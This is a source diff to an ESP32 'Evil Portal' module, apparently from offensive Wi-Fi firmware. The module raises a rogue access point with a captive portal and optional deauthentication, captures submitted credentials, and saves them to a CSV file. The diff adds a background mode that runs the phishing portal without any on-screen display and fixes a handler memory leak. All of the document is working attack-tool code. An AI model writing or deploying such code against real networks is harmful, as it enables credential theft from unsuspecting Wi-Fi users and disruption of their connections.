@@ -8,19 +8,30 @@
 #include "esp_wifi.h"
 #include "wifi_atks.h"
 
-EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode)
-    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode), webServer(80) {
+// Constructor with background mode support
+EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode)
+    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), 
+      _autoMode(autoMode), _backgroundMode(backgroundMode), webServer(80) {
     if (!setup()) return;
     beginAP();
-    loop();
-};
+    if (!_backgroundMode) {
+        loop();  // Full UI loop for foreground mode
+    }
+    // In background mode, caller manages heartbeat via processRequests()
+}
 
 EvilPortal::~EvilPortal() {
+    // Clean up handler to prevent memory leak
+    if (_captiveHandler) {
+        webServer.removeHandler(_captiveHandler);
+        delete _captiveHandler;
+        _captiveHandler = nullptr;
+    }
     webServer.end();
     dnsServer.stop();
     vTaskDelay(100 / portTICK_PERIOD_MS);
     wifiDisconnect();
-};
+}
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
     AsyncResponseStream *response = request->beginResponseStream("text/html");
@@ -99,8 +110,10 @@ bool EvilPortal::setup() {
 }
 
 void EvilPortal::beginAP() {
-    drawMainBorderWithTitle("EVIL PORTAL");
-    displayTextLine("Starting...");
+    if (!_backgroundMode) {
+        drawMainBorderWithTitle("EVIL PORTAL");
+        displayTextLine("Starting...");
+    }
     if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
     else WiFi.mode(WIFI_MODE_AP);
     WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
@@ -180,7 +193,7 @@ void EvilPortal::setupRoutes() {
 
     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
     webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
-    
+
     if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
         webServer.on(
             bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
@@ -221,16 +234,27 @@ void EvilPortal::setupRoutes() {
         }
     });
 
-    webServer.addHandler(new CaptiveRequestHandler(this)).setFilter(ON_AP_FILTER);
+    // Store handler pointer for cleanup
+    _captiveHandler = new CaptiveRequestHandler(this);
+    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
 }
 
 void EvilPortal::restartWiFi(bool reset) {
+    // Clean up old handler before restart
+    if (_captiveHandler) {
+        webServer.removeHandler(_captiveHandler);
+        delete _captiveHandler;
+        _captiveHandler = nullptr;
+    }
+    
     webServer.end();
     wifiDisconnect();
     WiFi.softAP(apName);
     webServer.begin();
     
-    webServer.addHandler(new CaptiveRequestHandler(this)).setFilter(ON_AP_FILTER);
+    // Re-add handler
+    _captiveHandler = new CaptiveRequestHandler(this);
+    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
     
     if (reset) resetCapturedCredentials();
 }
@@ -240,6 +264,8 @@ void EvilPortal::resetCapturedCredentials(void) {
 }
 
 void EvilPortal::loop() {
+    if (_backgroundMode) return;  // Background mode uses processRequests instead
+    
     int lastDeauthTime = millis();
     bool shouldRedraw = true;
 
@@ -272,6 +298,17 @@ void EvilPortal::loop() {
             wifiDisconnect();
             verifyPass = false;
         }
+    }
+}
+
+// Lightweight heartbeat for background mode
+void EvilPortal::processRequests() {
+    if (!_backgroundMode) return;
+    dnsServer.processNextRequest();
+    // Check for credentials without UI updates
+    if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
+        previousTotalCapturedCredentials = totalCapturedCredentials - 1;
+        // In background mode, we don't redraw, just let the tracker know
     }
 }
 
@@ -345,7 +382,7 @@ void EvilPortal::printDeauthStatus() {
 
 void EvilPortal::loadCustomHtml() {
     getFsStorage(fsHtmlFile);
-    htmlFileName = loopSD(*fsHtmlFile, true, "HTML");
+    htmlFileName = loopSD(*fsHtmlFile, true, "HTML", "/");
     String fileBaseName = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
     fileBaseName.toLowerCase();
     outputFile = fileBaseName + "_creds.csv";
